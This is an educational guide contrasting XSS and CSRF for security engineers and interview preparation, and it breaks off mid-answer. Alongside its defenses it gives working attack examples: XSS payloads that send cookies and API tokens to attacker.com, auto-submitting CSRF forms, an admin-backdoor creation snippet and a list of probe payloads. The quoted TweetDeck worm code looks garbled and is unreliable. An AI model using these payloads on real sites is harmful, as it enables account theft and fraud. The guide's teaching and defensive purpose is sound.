# XSS vs CSRF - Comprehensive Comparison Guide

---

## Introduction

Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two of the most important web application vulnerabilities that every security engineer must understand deeply. Despite both having "cross-site" in their names, they exploit fundamentally different trust relationships and require entirely different defense strategies.

**Why understanding the difference matters:**

- These are among the most frequently asked security interview questions — and the most commonly confused
- Misunderstanding the distinction leads to misapplied defenses (e.g., thinking SameSite cookies fix XSS)
- Both appear in the OWASP Top 10 and are consistently found in real-world assessments
- A mature security engineer must be able to articulate not just *what* each attack does, but *why* they work, how they interact, and which defenses apply to which threat

**The core trust distinction:**

- **XSS** exploits the **user's trust in a website** — the browser executes malicious code because it trusts content served from a legitimate origin
- **CSRF** exploits the **website's trust in the user's browser** — the server processes a request because it trusts the authenticated session cookie the browser automatically attaches

This single insight — that XSS and CSRF exploit trust in *opposite directions* — is the foundation for understanding everything else in this guide.

---

## Fundamental Differences

### What Each Attack Does

#### XSS (Cross-Site Scripting)

XSS occurs when an application includes attacker-controlled data in its output without proper encoding or sanitization, allowing the attacker to inject and execute arbitrary JavaScript in the context of a trusted origin.

**Core characteristics:**

- Injects malicious scripts into a trusted website's pages
- The injected code executes in the victim's browser within the application's origin
- Can read the DOM, access cookies (unless HttpOnly), interact with APIs, modify page content, exfiltrate data, and impersonate the user
- The attacker gains the full privileges of the application's JavaScript context

**Three primary types:**

1. **Reflected XSS** — Malicious input is immediately reflected back in the server's response (e.g., in search results or error messages). Requires the victim to click a crafted link.
2. **Stored XSS** — Malicious input is persisted (in a database, file, cache) and served to other users who view the affected page. No victim interaction beyond visiting the page.
3. **DOM-based XSS** — The vulnerability exists entirely in client-side JavaScript that processes attacker-controlled input (URL fragments, `postMessage`, etc.) without proper sanitization. The malicious payload never reaches the server.

**Additional variant:**

4. **Mutation XSS (mXSS)** — Exploits differences in how HTML parsers (browser vs. sanitizer) interpret markup. A payload that looks safe to the sanitizer mutates into executable script when the browser parses it.

#### CSRF (Cross-Site Request Forgery)

CSRF occurs when an attacker tricks a victim's browser into sending an authenticated request to a target application without the user's knowledge or intent. The attack leverages the browser's automatic inclusion of session cookies with every request to the target origin.

**Core characteristics:**

- Tricks the victim's browser into making unwanted requests to a site where they are authenticated
- Exploits the browser's automatic cookie-sending behavior
- The attacker **cannot read the response** — same-origin policy prevents cross-origin response access
- Forces **state-changing actions** only (fund transfers, password changes, email updates, privilege grants)
- The attacker is "blind" — they fire the request and hope it succeeds

**Key constraint:** CSRF is fundamentally a *write-only* attack. The attacker can make the victim's browser *send* a request, but cannot *read* what comes back. This is the critical limitation that distinguishes it from XSS.

---

### Trust Model Comparison

| Aspect | XSS | CSRF |
|--------|-----|------|
| **Trust exploited** | User trusts the website (browser executes code from trusted origin) | Server trusts the user's browser (accepts requests with valid session cookie) |
| **Attacker's goal** | Execute arbitrary code in victim's browser context | Perform state-changing actions as the victim |
| **Data exfiltration** | Yes — can read DOM, cookies, localStorage, API responses | No — cannot read responses (same-origin policy) |
| **Requires authentication** | No (but far more damaging if victim is authenticated) | Yes (the entire attack depends on an existing session) |
| **Attacker interaction** | Can be interactive — persistent code that responds, keylogging, real-time exfil | Fire-and-forget — single blind request |
| **Victim interaction** | Reflected: click link; Stored: visit page; DOM: navigate to crafted URL | Visit attacker's page or click attacker's link |
| **Same-origin policy** | Bypassed — code runs *within* the trusted origin | Enforced — attacker cannot read cross-origin responses |
| **Persistence** | Stored XSS persists until the payload is removed | Each attack is a one-time action |

---

## Attack Mechanics Deep Dive

### XSS Attack Flow

#### Reflected XSS

The attacker crafts a URL containing malicious JavaScript. The server includes the attacker's input in its response without encoding. When the victim clicks the link, the script executes.

**Flow:** Attacker crafts URL → victim clicks link → server reflects input in response → browser executes script in trusted origin

**Realistic example — search functionality:**

```python
# Vulnerable server code (Flask)
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = db.search(query)
    return f'''
        <h2>Search results for: {query}</h2>
        <div>{render_results(results)}</div>
    '''
```

**Attack URL:**

```
https://vulnerable.com/search?q=<script>
  var img = new Image();
  img.src = 'https://attacker.com/collect?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Delivery:** The attacker sends this URL to the victim via email, chat, or embeds it in a shortened link. When the victim clicks, the server responds with an HTML page containing the script, which the browser executes because it came from `vulnerable.com`.

#### Stored XSS

The attacker submits malicious input that gets stored in the application's database. When other users view the page containing the stored data, the script executes automatically.

**Flow:** Attacker submits payload → server stores it → other users view page → browser executes stored script

**Realistic example — comment system:**

```python
# Vulnerable server code
@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.form.get('comment')
    db.save_comment(comment)  # Stored as-is
    return redirect('/post/123')

@app.route('/post/<int:post_id>')
def view_post(post_id):
    comments = db.get_comments(post_id)
    html = '<div class="comments">'
    for comment in comments:
        html += f'<div class="comment">{comment.text}</div>'  # No encoding
    html += '</div>'
    return html
```

**Attack payload submitted as a comment:**

```html
Great article! <script>
(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/api/user/profile', true);
    xhr.onload = function() {
        var data = JSON.parse(this.responseText);
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify({
                email: data.email,
                name: data.name,
                token: data.api_token,
                cookies: document.cookie
            })
        });
    };
    xhr.send();
})();
</script>
```

Every user who views the post has their profile data and cookies exfiltrated.

#### DOM-based XSS

The vulnerability exists entirely in client-side JavaScript. The server never sees the malicious payload — it may be in the URL fragment (`#`), which browsers don't send to the server.

**Flow:** Victim visits crafted URL → client-side JS reads attacker-controlled input → input used in dangerous sink → script executes

**Realistic example — client-side routing:**

```javascript
// Vulnerable client-side code
const page = location.hash.substring(1);
document.getElementById('content').innerHTML = '<h1>Welcome to ' + page + '</h1>';
```

**Attack URL:**

```
https://vulnerable.com/#<img src=x onerror="fetch('https://attacker.com/steal?'+document.cookie)">
```

The fragment after `#` is never sent to the server, so server-side sanitization cannot catch this. The vulnerability is purely in the client-side `innerHTML` assignment.

**Common DOM XSS sinks:**

- `element.innerHTML`, `element.outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout(string)`, `setInterval(string)`
- `new Function(string)`
- `element.setAttribute('onclick', ...)`
- `location.href`, `location.assign()`, `location.replace()`

**Common DOM XSS sources:**

- `location.hash`, `location.search`, `location.href`
- `document.referrer`
- `window.name`
- `postMessage` data
- `document.cookie`
- Web Storage (localStorage, sessionStorage)

#### Mutation XSS (mXSS)

Exploits differences between how an HTML sanitizer parses markup and how the browser ultimately renders it. The sanitizer sees safe HTML; the browser's parser mutates it into something executable.

**Example:**

```html
<!-- Input that a sanitizer might consider safe -->
<p id="test"><math><mi><table><mglyph><style><!--</style>
<img src=x onerror=alert(1)>
```

When the browser's HTML parser processes this, the nesting of `<math>`, `<mi>`, `<table>`, and `<style>` elements triggers parser re-interpretation that "breaks out" the `<img>` tag from the style context, making it executable.

**Why mXSS matters:** It bypasses sanitization libraries that rely on their own parsing rather than the browser's actual behavior. This is why using the browser's native DOMParser or trusted sanitization APIs is critical.

---

### CSRF Attack Flow

#### GET-based CSRF

The simplest form — uses an HTML element that triggers a GET request.

**Flow:** Victim visits attacker's page → page loads an image/iframe with target URL → browser sends authenticated GET request

**Realistic example — router admin panel:**

```html
<!-- Attacker's page -->
<h1>Cute cat pictures!</h1>
<img src="https://admin.router.local/api/dns?server=8.8.8.8" width="0" height="0">
<img src="https://admin.router.local/api/firewall?action=disable" width="0" height="0">
```

When the victim (who is logged into their router admin panel) visits this page, the browser sends authenticated GET requests that change DNS settings and disable the firewall.

**Why GET-based CSRF is especially dangerous:** Many developers implement state-changing operations as GET requests (violating HTTP semantics), and GET requests can be triggered by `<img>`, `<script>`, `<link>`, CSS `url()`, and many other HTML elements without any JavaScript.

#### POST-based CSRF

Uses an auto-submitting HTML form.

**Flow:** Victim visits attacker's page → hidden form auto-submits → browser sends authenticated POST request with attacker's parameters

**Realistic example — bank transfer:**

```html
<!-- Attacker's page: evil.com/winning.html -->
<html>
<body onload="document.getElementById('csrf-form').submit();">
  <h1>Congratulations! You've won a prize!</h1>
  <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display:none;">
    <input type="hidden" name="to_account" value="ATTACKER-IBAN-12345" />
    <input type="hidden" name="amount" value="5000" />
    <input type="hidden" name="currency" value="USD" />
  </form>
</body>
</html>
```

The form auto-submits on page load. The victim's browser includes the bank's session cookie. The bank's server sees a valid authenticated POST request and processes the transfer.

#### Login CSRF

An often-overlooked variant: the attacker forces the victim to log into the *attacker's* account.

**Flow:** Attacker creates form that logs victim into attacker's account → victim performs actions believing they're in their own account → attacker later reviews account activity

**Realistic example:**

```html
<!-- Force login to attacker's account -->
<form action="https://cloud-storage.com/login" method="POST">
  <input type="hidden" name="username" value="attacker@evil.com" />
  <input type="hidden" name="password" value="attacker-password" />
</form>
<script>document.forms[0].submit();</script>
```

**Why it matters:** If the victim uploads sensitive files while unknowingly logged into the attacker's account, the attacker gains access to those files. Google once had this vulnerability — attackers could force victims to log into the attacker's Google account and capture their search history.

#### JSON-based CSRF

Modern APIs often expect JSON payloads. Attackers can sometimes send JSON via form submissions or exploit CORS misconfigurations.

**Realistic example — exploiting lenient content-type handling:**

```html
<!-- Attempt 1: Form with enctype that sends JSON-like data -->
<form action="https://api.target.com/user/settings" method="POST"
      enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}' />
</form>
<script>document.forms[0].submit();</script>
```

This sends a request body of: `{"email":"attacker@evil.com","ignore":"="}` — which is valid JSON if the server doesn't strictly validate Content-Type.

**Attempt 2 — using `fetch` with `no-cors` mode:**

```javascript
// This will send the request but cannot read the response
// However, the Content-Type will be limited to form types
fetch('https://api.target.com/user/settings', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ email: 'attacker@evil.com' }),
    credentials: 'include'
});
```

**Defenses against JSON CSRF:**

- Strictly validate `Content-Type: application/json` (forms can't set this header cross-origin without CORS preflight)
- Require a custom header (e.g., `X-Requested-With`) — custom headers trigger CORS preflight
- Standard CSRF tokens in a custom header

---

### Combined Attack: XSS Enabling CSRF Bypass

This is perhaps the most critical insight in this entire comparison: **XSS on the same origin completely defeats CSRF protections**.

**Why this happens:**

When an attacker has XSS in the target application, the malicious script runs *within* the application's origin. This means:

1. **It can read CSRF tokens** from hidden form fields, meta tags, or API responses
2. **It can craft requests with all necessary headers** including custom headers like `X-Requested-With` or `X-CSRF-Token`
3. **It operates within the same origin**, so SameSite cookies are included normally
4. **It can read responses**, unlike traditional CSRF, making the attack bidirectional
5. **CORS restrictions don't apply** because the request originates from the same origin

**Example — XSS defeating CSRF token protection:**

```javascript
// Step 1: Fetch a page that contains the CSRF token
fetch('/settings')
  .then(response => response.text())
  .then(html => {
      // Step 2: Extract the CSRF token
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const csrfToken = doc.querySelector('input[name="csrf_token"]').value;

      // Step 3: Perform the "CSRF" attack with the valid token
      return fetch('/settings/change-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `email=attacker@evil.com&csrf_token=${csrfToken}`
      });
  })
  .then(response => {
      // Step 4: Unlike real CSRF, XSS can read the response
      console.log('Email changed successfully:', response.status);
  });
```

**Example — XSS bypassing SameSite cookies:**

```javascript
// SameSite cookies are sent because this script runs on the SAME SITE
// The browser doesn't know this JavaScript was injected — it trusts the origin
fetch('/api/admin/add-user', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': extractedToken
    },
    body: JSON.stringify({
        username: 'backdoor',
        role: 'admin',
        password: 'attacker123'
    })
});
```

**This is why XSS is generally considered more severe than CSRF.** An XSS vulnerability effectively gives the attacker the ability to do anything the victim can do — including bypassing every CSRF defense mechanism in place.

---

## Defense Mechanisms Comparison

### XSS Defenses

#### 1. Output Encoding (Primary Defense)

Context-dependent encoding is the most critical XSS defense. The encoding must match the context where the data is being inserted.

| Context | Encoding Required | Example |
|---------|------------------|---------|
| HTML body | HTML entity encoding | `<` → `&lt;` |
| HTML attribute | Attribute encoding | `"` → `&quot;` |
| JavaScript | JavaScript encoding | `'` → `\x27` |
| URL parameter | URL encoding | `<` → `%3C` |
| CSS | CSS encoding | `(` → `\28` |

```python
# Context-dependent encoding example (Python)
from markupsafe import escape
import urllib.parse
import json

user_input = request.args.get('name')

# HTML context
html_safe = escape(user_input)  # <script> → &lt;script&gt;

# URL context
url_safe = urllib.parse.quote(user_input, safe='')

# JavaScript context (embedding in a script block)
js_safe = json.dumps(user_input)  # Produces a safely quoted string

# WRONG: Using HTML encoding in JavaScript context
# <script>var name = '{{ html_escape(user_input) }}';</script>
# An attacker can break out with: ';alert(1);//
```

#### 2. Content Security Policy (CSP)

CSP provides a defense-in-depth layer that limits what injected scripts can do even if XSS occurs.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self'
```

**CSP with strict-dynamic** for modern applications:

```
Content-Security-Policy:
  script-src 'nonce-r4nd0m123' 'strict-dynamic';
  object-src 'none';
  base-uri 'self'
```

`strict-dynamic` propagates trust to scripts loaded by already-trusted scripts, simplifying CSP for applications that dynamically load modules.

#### 3. Trusted Types API

A newer browser API that enforces type-safe DOM manipulation, preventing DOM XSS at the browser level.

```javascript
// Enforce Trusted Types via CSP
// Content-Security-Policy: require-trusted-types-for 'script'

// Create a policy
const sanitizePolicy = trustedTypes.createPolicy('sanitize', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScript: (input) => { throw new Error('Scripts not allowed'); },
    createScriptURL: (input) => {
        const url = new URL(input, document.baseURI);
        if (url.origin === location.origin) return url.href;
        throw new Error('Untrusted script URL: ' + input);
    }
});

// Now innerHTML requires a TrustedHTML object
element.innerHTML = sanitizePolicy.createHTML(userInput);  // Safe
element.innerHTML = userInput;  // Throws TypeError
```

#### 4. Framework-Level Protections

Modern frameworks provide automatic encoding by default:

- **React:** Auto-escapes JSX expressions. Dangerous: `dangerouslySetInnerHTML`
- **Angular:** Auto-sanitizes bindings. Dangerous: `bypassSecurityTrustHtml()`
- **Vue:** Auto-escapes `{{ }}` interpolation. Dangerous: `v-html` directive

```jsx
// React — safe by default
function Comment({ text }) {
    return <div>{text}</div>;  // Auto-escaped
}

// React — explicitly dangerous
function Comment({ htmlContent }) {
    return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;  // XSS risk!
}
```

#### 5. HttpOnly Cookies

Does **not prevent XSS** but limits the impact by making session cookies inaccessible to JavaScript.

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

**Limitation:** An attacker with XSS can still perform actions as the user by making fetch/XHR requests — they just can't steal the cookie value and use it from another machine.

#### 6. Input Validation and Sanitization

A supplementary defense — never the primary one.

```python
import bleach

# Whitelist-based HTML sanitization
allowed_tags = ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li']
allowed_attrs = {'a': ['href', 'title']}
clean_html = bleach.clean(
    user_html,
    tags=allowed_tags,
    attributes=allowed_attrs,
    strip=True
)
```

---

### CSRF Defenses

#### 1. Synchronizer Token Pattern (Primary Defense)

The server generates a unique, unpredictable token tied to the user's session and embeds it in every state-changing form. The server validates the token on submission.

```python
# Server-side token generation (Flask example)
import secrets

@app.before_request
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)

# Template
# <form method="POST" action="/transfer">
#   <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
#   ...
# </form>

@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        abort(403, 'CSRF token validation failed')
    # Process the transfer
```

**Why it works:** The attacker cannot read the token because same-origin policy prevents cross-origin reads. Without the valid token, the forged request is rejected.

#### 2. Double Submit Cookie Pattern

An alternative when server-side state is difficult (e.g., stateless APIs). The token is stored in both a cookie and a request parameter; the server checks they match.

```javascript
// Client-side: read token from cookie and include in request header
function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? match[2] : null;
}

fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': getCookie('csrf_token')
    },
    body: JSON.stringify({ amount: 100, to: 'recipient' })
});
```

```python
# Server-side validation
@app.route('/api/transfer', methods=['POST'])
def transfer():
    cookie_token = request.cookies.get('csrf_token')
    header_token = request.headers.get('X-CSRF-Token')
    if not cookie_token or cookie_token != header_token:
        abort(403, 'CSRF validation failed')
    # Process request
```

**Why it works:** An attacker can cause the browser to *send* the cookie, but cannot *read* it (same-origin policy), so they can't duplicate the value in the request header.

**Weakness:** If an attacker can set cookies on the target domain (e.g., via a subdomain XSS or cookie injection), they can bypass this defense. Use `__Host-` cookie prefix to mitigate:

```
Set-Cookie: __Host-csrf=token123; Secure; Path=/; SameSite=Lax
```

#### 3. SameSite Cookie Attribute

Instructs the browser to restrict when cookies are sent in cross-site requests.

| Value | Behavior | CSRF Protection |
|-------|----------|-----------------|
| `Strict` | Cookie never sent on cross-site requests | Strong — but breaks inbound links (user appears logged out) |
| `Lax` | Cookie sent on top-level navigations (GET) but not cross-site POST/iframe/AJAX | Good — protects POST-based CSRF; GET actions still vulnerable |
| `None` | Cookie always sent (requires `Secure`) | None |

```
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
```

**Important:** `SameSite=Lax` is now the default in modern browsers (Chrome, Edge, Firefox). This has dramatically reduced CSRF risk for applications that properly use POST for state-changing operations.

#### 4. Custom Request Headers

Require a custom header on state-changing requests. Custom headers on cross-origin requests trigger a CORS preflight, which will be denied if CORS is not configured to allow the attacker's origin.

```javascript
// Client-side
fetch('/api/settings', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: JSON.stringify(data)
});
```

```python
# Server-side
@app.route('/api/settings', methods=['POST'])
def update_settings():
    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
        abort(403, 'Missing custom header')
    # Process request
```

**Why it works:** HTML forms cannot set custom headers. JavaScript from a cross-origin page cannot set custom headers without CORS preflight approval.

#### 5. Origin/Referer Header Validation

Check the `Origin` or `Referer` header to verify the request came from the expected origin.

```python
ALLOWED_ORIGINS = {'https://app.example.com', 'https://www.example.com'}

@app.before_request
def validate_origin():
    if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')

        if origin:
            if origin not in ALLOWED_ORIGINS:
                abort(403, 'Invalid origin')
        elif referer:
            from urllib.parse import urlparse
            parsed = urlparse(referer)
            referer_origin = f"{parsed.scheme}://{parsed.netloc}"
            if referer_origin not in ALLOWED_ORIGINS:
                abort(403, 'Invalid referer')
        else:
            # No origin or referer — can happen with privacy extensions
            # Decision: block (safer) or allow (more compatible)
            abort(403, 'Missing origin information')
```

**Caveats:**

- Some browsers/proxies strip `Referer` headers
- Privacy extensions may suppress `Origin`
- Should be a supplementary defense, not the sole protection

#### 6. Re-authentication for Sensitive Actions

For high-impact operations, require the user to re-enter their password or complete a second factor.

```python
@app.route('/change-password', methods=['POST'])
def change_password():
    # Require current password even though user is authenticated
    current_password = request.form.get('current_password')
    if not verify_password(current_user, current_password):
        abort(403, 'Current password verification failed')
    # Process password change
```

This defeats both CSRF (attacker doesn't know current password) and session hijacking.

---

### Which Defenses Overlap

Understanding which defenses apply to which attack is critical for interview discussions:

| Defense | Helps with XSS? | Helps with CSRF? | Notes |
|---------|:---:|:---:|-------|
| Output encoding | **Yes** (primary) | No | Prevents script injection at the source |
| CSP | **Yes** (defense-in-depth) | No | Limits what injected scripts can do |
| Trusted Types | **Yes** (DOM XSS) | No | Enforces type-safe DOM manipulation |
| HttpOnly cookies | Partially (limits impact) | No | Prevents cookie theft but not XSS actions |
| CSRF tokens | No | **Yes** (primary) | Validates request authenticity |
| SameSite cookies | No | **Yes** | Restricts cross-site cookie sending |
| Custom headers | No | **Yes** | Triggers CORS preflight for cross-origin |
| Origin validation | No | **Yes** (supplementary) | Verifies request source |
| Input validation | Partially | Partially | Defense-in-depth for both |
| Re-authentication | No | **Yes** (high-value ops) | Additional verification layer |

**Key insight:** There is almost zero overlap. You need **both sets of defenses** deployed together. Implementing only CSRF protections leaves you vulnerable to XSS, and vice versa.

---

### Why XSS Defeats CSRF Protections

This deserves its own section because it is one of the most important security concepts:

1. **CSRF tokens become useless** — XSS script on the same origin can read tokens from forms, meta tags, or API endpoints and include them in forged requests

2. **SameSite cookies don't help** — The XSS script runs on the *same site*, so all cookies are attached normally. SameSite only restricts *cross-site* requests

3. **Custom header requirements are bypassed** — JavaScript on the same origin can set any header on fetch/XHR requests

4. **Origin/Referer validation passes** — Requests from XSS originate from the legitimate origin

5. **Double-submit cookies are defeated** — XSS can read cookies via `document.cookie` and duplicate the value in the request parameter

**The conclusion:** XSS prevention is *foundational* — it must be the first priority. If XSS exists, CSRF protections are irrelevant because the attacker can work within the same origin.

---

## Impact Comparison

### XSS Impact Severity

XSS is considered one of the most versatile web vulnerabilities because the attacker gains JavaScript execution in the victim's browser:

| Impact Category | Description | Severity |
|----------------|-------------|----------|
| **Session hijacking** | Steal session cookies/tokens (if not HttpOnly) and impersonate the user | Critical |
| **Credential theft** | Inject fake login forms, deploy keyloggers | Critical |
| **Data exfiltration** | Read sensitive page content, API responses, localStorage | Critical |
| **Account takeover** | Change email/password, add attacker's MFA device | Critical |
| **Malware distribution** | Redirect users to exploit kits or malware downloads | High |
| **Cryptocurrency mining** | Inject mining scripts that use victim's CPU | Medium |
| **Defacement** | Modify page content to display attacker's message | Medium |
| **Phishing** | Display convincing phishing content within the trusted domain | High |
| **Worm propagation** | Self-replicating XSS that spreads across users | Critical |
| **Keylogging** | Capture all keystrokes on the page | Critical |
| **Webcam/mic access** | Trigger permission prompts from trusted origin | High |
| **Network scanning** | Probe internal network via victim's browser | High |

### CSRF Impact Severity

CSRF impact depends entirely on what state-changing actions the target application exposes:

| Impact Category | Description | Severity |
|----------------|-------------|----------|
| **Unauthorized transactions** | Fund transfers, purchases, payments | Critical |
| **Account takeover** | Change email → password reset → full takeover | Critical |
| **Privilege escalation** | Create admin accounts, grant elevated roles | Critical |
| **Data modification** | Change settings, delete records, modify profiles | High |
| **Social engineering** | Post content as victim, send messages | Medium |
| **Configuration changes** | Modify security settings, disable protections | High |

**Key limitation:** CSRF **cannot directly steal data**. It is a blind, write-only attack. The attacker can force actions but cannot observe their results.

### Risk Rating Comparison

| Metric | XSS | CSRF |
|--------|-----|------|
| **CWE** | CWE-79 | CWE-352 |
| **Typical CVSS** | 6.1–9.6 (varies by type and context) | 4.3–8.8 (depends on action impacted) |
| **OWASP Top 10** | A03:2021 Injection | A01:2021 Broken Access Control |
| **General severity ranking** | Higher (versatile, data exfil possible) | Lower (blind, action-only) |
| **Stored XSS vs CSRF** | Stored XSS is almost always rated Critical | CSRF on admin actions can be Critical |

**Nuance:** A CSRF on a wire transfer endpoint at a bank is more impactful than a reflected XSS on a static marketing page. Context always matters. But *given equivalent attack surfaces*, XSS is rated higher because it is more versatile and subsumes CSRF capability.

---

## Testing Comparison

### Testing for XSS

**Manual testing approach:**

1. **Identify all input vectors** — form fields, URL parameters, headers (User-Agent, Referer), file uploads, API bodies, WebSocket messages
2. **Inject test payloads** — context-aware probes, not just `<script>alert(1)</script>`
3. **Check output encoding** — inspect the HTML source to see how your input is rendered
4. **Test different contexts** — HTML body, attributes, JavaScript, URLs, CSS

**Context-aware test payloads:**

```
HTML context:       <img src=x onerror=alert(1)>
Attribute context:  " onfocus=alert(1) autofocus="
JS string context:  ';alert(1);//
JS template lit:    ${alert(1)}
URL context:        javascript:alert(1)
CSS context:        expression(alert(1))  /* IE legacy */
SVG context:        <svg onload=alert(1)>
MathML context:     <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

**DOM XSS testing:**

```javascript
// Check for dangerous patterns in client-side code
// Search source code for patterns like:
document.write(location.hash)
element.innerHTML = url.searchParams.get('q')
eval(window.name)
```

**Automated tools:**

- **Burp Suite Scanner** — comprehensive, context-aware XSS detection
- **OWASP ZAP** — open-source alternative with active scanning
- **Nuclei** — template-based scanning with XSS templates
- **Semgrep** — static analysis for source code (finds dangerous sinks)
- **DOM Invader** (Burp extension) — specialized DOM XSS testing

### Testing for CSRF

**Manual testing checklist:**

1. **Identify state-changing endpoints** — POST, PUT, DELETE, PATCH requests
2. **Check for anti-CSRF tokens** — are they present in forms/headers?
3. **Validate token enforcement** — remove the token, modify it, reuse an old one
4. **Check SameSite attributes** — inspect `Set-Cookie` headers
5. **Test Origin/Referer validation** — remove headers, modify values
6. **Check Content-Type enforcement** — can you submit `application/json` endpoints via forms?

**Step-by-step CSRF test:**

```
1. Log into the target application
2. Identify a state-changing request (e.g., change email)
3. Capture the request in Burp Suite
4. Right-click → "Generate CSRF PoC" (Burp Pro) or create manually
5. Modify the PoC: change parameter values to attacker-controlled
6. Remove or modify the CSRF token
7. Open the PoC in a browser where you're logged into the target
8. Check if the action was performed
```

**CSRF PoC template:**

```html
<html>
<body>
  <h1>CSRF Test</h1>
  <form id="csrf" action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <!-- Deliberately omit CSRF token -->
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**Automated tools:**

- **Burp Suite** — CSRF PoC generator, passive checks for missing tokens
- **OWASP ZAP** — anti-CSRF token detection
- **CSRFTester (OWASP)** — dedicated CSRF testing tool

### Testing Comparison Table

| Aspect | XSS Testing | CSRF Testing |
|--------|-------------|--------------|
| **Primary technique** | Payload injection in inputs | Remove/modify tokens in requests |
| **What to look for** | Unencoded output in response | Missing or unenforced tokens |
| **Automation** | Highly automatable (scanners) | Partially automatable |
| **False positives** | Common (encoded but still flagged) | Rare (either token is checked or it isn't) |
| **Skill required** | High (context-dependent encoding) | Moderate (mostly systematic checking) |
| **Time to test** | Longer (many inputs, contexts) | Shorter (focus on state-changing ops) |

---

## Real-World Examples

### Famous XSS Attacks

#### Samy Worm (MySpace, 2005)

The first self-propagating XSS worm. Samy Kamkar exploited a stored XSS vulnerability in MySpace profiles. The worm:

- Added Samy as a friend to every infected user's profile
- Added "but most of all, samy is my hero" to their profile
- Copied itself to the victim's profile, infecting anyone who viewed it
- Infected over 1 million users in under 20 hours

**Technical insight:** Samy bypassed MySpace's HTML filters by using CSS expressions, JavaScript's `eval()` with string concatenation, and creative tag attribute abuse. The worm payload was only ~4KB.

**Impact:** MySpace was forced to go offline to clean up. Samy faced criminal charges and was sentenced to community service and probation.

#### British Airways / Magecart (2018)

Attackers compromised British Airways' website and mobile app by injecting a malicious script (22 lines of JavaScript) that:

- Captured payment card details as customers entered them
- Exfiltrated data to a lookalike domain (`baways.com`)
- Ran undetected for approximately 15 days
- Affected ~380,000 transactions

**Impact:** BA was fined £20 million by the UK ICO under GDPR (reduced from an initial £183 million proposed fine).

#### TweetDeck Worm (2014)

A stored XSS vulnerability in TweetDeck allowed a self-retweeting worm. The payload was embedded in a tweet:

```
<script class="xss">$('.telerik-reSt498').telerik-reStContent
.telerik-reStRepl498 document.write('');
</script>✞
```

The worm caused approximately 80,000 users to unknowingly retweet the malicious tweet.

### Famous CSRF Attacks

#### Gmail Email Filter Attack (2007)

A CSRF vulnerability in Gmail allowed attackers to create email forwarding filters in the victim's account:

- The victim visited a malicious page while logged into Gmail
- The page submitted a forged POST request to Gmail's filter creation endpoint
- A new filter was created that forwarded all emails matching specific criteria to the attacker
- The attacker silently received copies of the victim's emails

**Impact:** This was used in targeted attacks against specific individuals to intercept sensitive communications.

#### Netflix Account Takeover (2006)

Researchers discovered CSRF vulnerabilities in Netflix that allowed:

- Changing the shipping address for DVD rentals
- Adding movies to the victim's queue
- Changing account credentials
- In combination, achieving full account takeover

The attack required only that the victim visit a malicious page while logged into Netflix.

#### ING Direct (Banking)

A CSRF vulnerability in ING Direct's banking application allowed attackers to:

- Open additional accounts in the victim's name
- Transfer funds from the victim's existing accounts to the newly created accounts
- The attack exploited the lack of re-authentication for fund transfers

**Impact:** Demonstrated that even financial institutions were vulnerable to CSRF, driving industry-wide adoption of anti-CSRF tokens in banking applications.

---

## Common Interview Questions

### Q1: "What's the difference between XSS and CSRF?"

**Ideal answer template:**

> "XSS and CSRF exploit trust in opposite directions. XSS exploits the user's trust in a website — the browser executes malicious code because it was served from a trusted origin. CSRF exploits the website's trust in the user's browser — the server processes a request because the browser automatically attached valid session cookies.
>
> With XSS, the attacker can execute arbitrary JavaScript in the victim's browser, which means they can read data, steal credentials, and perform any action the user can. With CSRF, the attacker can only force the victim's browser to perform specific actions — they cannot read responses, so it's a blind, write-only attack.
>
> The defenses are different too: XSS is primarily prevented by output encoding and CSP, while CSRF is prevented by anti-CSRF tokens and SameSite cookies. Critically, XSS can bypass CSRF protections because the injected script operates within the same origin."

### Q2: "Can XSS lead to CSRF?"

**Answer:**

> "Yes, and this is a crucial point. If an attacker has XSS on the target application, they can bypass all CSRF defenses because their script runs within the same origin. The script can read CSRF tokens from forms or meta tags, set custom headers, and the browser will include SameSite cookies since the request originates from the same site. Essentially, XSS subsumes CSRF — an XSS vulnerability makes CSRF protections irrelevant for that application."

### Q3: "If you could only fix one vulnerability — XSS or CSRF — which would you prioritize?"

**Answer:**

